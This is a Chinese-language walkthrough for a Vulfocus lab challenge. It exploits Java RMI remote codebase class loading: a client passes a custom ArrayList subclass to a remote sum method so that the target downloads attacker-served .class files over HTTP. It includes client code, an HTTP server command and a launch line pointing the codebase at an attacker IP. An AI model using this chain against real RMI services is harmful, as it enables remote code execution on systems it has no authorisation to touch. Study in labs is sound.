# java-rmi-codebase 代码执行

> **题库信息：**题名「java-rmi-codebase 代码执行」；镜像 `vulfocus/java-rmi-codebase:latest`；内部端口 `1099,64000`；无 CVE。
>
> **一句话链路：**通过 RMI Registry 查找 `refObj`，调用 `ICalc.sum(List<Integer>)`；传入一个服务端本地不存在的 `ArrayList` 子类，并让客户端序列化的 codebase 指向自己提供的 HTTP `.class` 文件目录。目标 JVM 若允许从请求 codebase 加载类，就会下载并反序列化该类，进入类的触发逻辑。[S1][S2][S3]
>
> 公开复现给出了 `refObj`、`sum` 和 `Payload extends ArrayList<Integer>` 这条直接链路；它基于原始 RMI codebase 示例，不足以证明 Vulfocus `latest` 的实际构建、端口映射和 JVM 参数完全相同。先用注册表返回的信息核对目标，不匹配时不要猜接口。[S1][S2]

## 操作步骤

1. **确认 Registry 和远程对象地址。**按题库端口访问实例：`1099` 是 RMI Registry；题库还列出 `64000`，实际远程对象通信使用哪个端口以 lookup 返回的 stub 为准。用客户端 `Naming.list("rmi://<目标地址>:1099/")` 查看绑定名，公开复现使用 `refObj`；再 lookup 该对象，检查 stub 中公布的主机和端口是否从你的机器可达。RMI 会先连接 Registry，再按 stub 中的信息连接远程对象；因此只通 `1099` 不代表方法调用端口也通。[S1][S2][S4]
2. **准备匹配服务端方法签名的客户端。**公开示例接口是 `ICalc.sum(List<Integer>)`。客户端通过 `Naming.lookup("rmi://<目标地址>:1099/refObj")` 取得远程对象，再传入 `Payload extends ArrayList<Integer>`，例如加入 `3`、`4` 后调用 `sum`。Payload 类须为服务端本地 classpath 中不存在的自定义类，避免服务端直接使用本地类而不请求 codebase。[S2][S3]

   ```java
   ICalc r = (ICalc) Naming.lookup("rmi://<目标地址>:1099/refObj");
   List<Integer> values = new RMIClient().new Payload();
   values.add(3);
   values.add(4);
   System.out.println(r.sum(values));
   ```

3. **编译并提供类文件。**按复现中的接口与客户端源码编译，例如 `javac ICalc.java RMIClient.java`。在编译产物目录启动 HTTP 文件服务（示例端口 `8000`）：`python3 -m http.server 8000`。从目标容器可达的地址应是攻击机/测试机的真实网卡 IP，不能写 `127.0.0.1` 或 `localhost`；codebase 路径需与 Java 包目录一致。[S2][S3]
4. **设置 codebase 并调用远程方法。**启动客户端时把 `java.rmi.server.codebase` 指向 HTTP 类文件目录，目录 URL 末尾保留 `/`；再按复现运行 `RMIClient`。原始 Java 8 示例还使用了 `java.security.policy`。关键前提是**目标服务端 JVM**已启用允许远程类加载的配置（该复现使用 SecurityManager，并将 `java.rmi.server.useCodebaseOnly` 设为 `false`）；仅在攻击机命令上设置这个属性不会改变目标 JVM。[S2][S3]

   ```bash
   java -Djava.rmi.server.useCodebaseOnly=false \
        -Djava.rmi.server.codebase=http://<攻击机可达IP>:8000/ \
        -Djava.security.policy=client.policy RMIClient
   ```

5. **看链路是否走到目标端。**HTTP 服务日志中出现来自目标实例的 `.class` 请求，表示目标尝试按 codebase 取类；再结合该复现中放在类加载/反序列化路径里的无害验证动作确认后续效果。只看到 Registry 查询、`sum` 返回结果或 HTTP 请求中的任一项，都不能单独证明目标端代码触发成功。[S2][S3]

## 本题特有排坑

- **Registry 端口和对象端口是两段连接。**`1099` 用于查绑定；方法调用使用 stub 公布的地址/端口。题库列出 `64000`，但实际以 lookup 返回的 stub 为准。stub 若公布 `127.0.0.1`、容器内地址或不可达端口，就会出现“能查到对象、调用却超时/拒绝连接”；`64000` 不是提供 `.class` 的 HTTP 端口。[S2][S4]
- **远程加载开关要看目标 JVM。**公开链路依赖目标允许使用客户端附带的 codebase。客户端自己加 `-Djava.rmi.server.useCodebaseOnly=false` 不会替目标打开该开关；若目标配置不满足，HTTP 文件服务通常收不到类请求。[S2][S3]
- **不要让本地 classpath 抢先命中。**若客户端/目标本地已有同名 `Payload.class`，就可能不按预期从 HTTP codebase 加载；清理本地重复类，并按包名放置编译产物。[S2][S3]
- **Codebase 目录 URL 要以 `/` 结尾。**并确保服务端下载地址可达、类文件名和包路径正确；`ClassNotFoundException` 或 HTTP 404 优先检查这几项。[S2][S3]
- **复现代码中的静态初始化也会在本地客户端加载类时执行。**不要把会破坏环境的动作直接放进客户端启动必经的静态代码块；先用无害动作理解触发位置，再按目标端反序列化路径验证。[S2]
- **这是“远程参数类按 codebase 加载”链路。**不要替换成 RMI Registry `bind/rebind` 反序列化或 JNDI `Reference` 链；它们不是本题这条直接复现步骤。[S1][S2]

## 来源

- **[S1] 同题环境复现：**[Vulhub 搭建 Java RMI 反序列化：java-rmi-codebase 漏洞复现](https://blog.csdn.net/AsagiRiAsagi/article/details/129591849) — 题名与原始 Vulhub `java-rmi-codebase` 环境直接对应；页面正文访问受限，因此只作为同题线索，不用它补写未读到的命令。
- **[S2] RMI codebase 直接复现：**[浅谈 Java RMI — 天下大木头](https://wjlshare.com/archives/1522) — 给出 `RemoteRMIServer`、`refObj`、`ICalc.sum(List<Integer>)`、`Payload extends ArrayList<Integer>`、客户端 `java.rmi.server.codebase`、HTTP 类文件服务和 Java 8 安全策略的完整示例；它是可复现的同类 RMI codebase 样例，不是 Vulfocus 镜像版本说明。
- **[S3] Oracle Java RMI 官方文档：**[Dynamic code downloading using Java RMI](https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/codebase.html) — 说明客户端 codebase 如何随未知子类参数传递、接收端何时尝试下载类，以及目录 URL 需要以 `/` 结尾；不描述本题镜像配置。
- **[S4] Oracle Java RMI 官方 FAQ：**[Frequently Asked Questions — RMI and Object Serialization](https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/faq.html) — 说明 Registry 返回的远程引用包含实际服务主机和端口，客户端随后还要连接该地址；可用于排查端口与主机不可达，不提供本题 payload。

来源清单：[`../sources/047_java-rmi-codebase/_meta.md`](../sources/047_java-rmi-codebase/_meta.md)




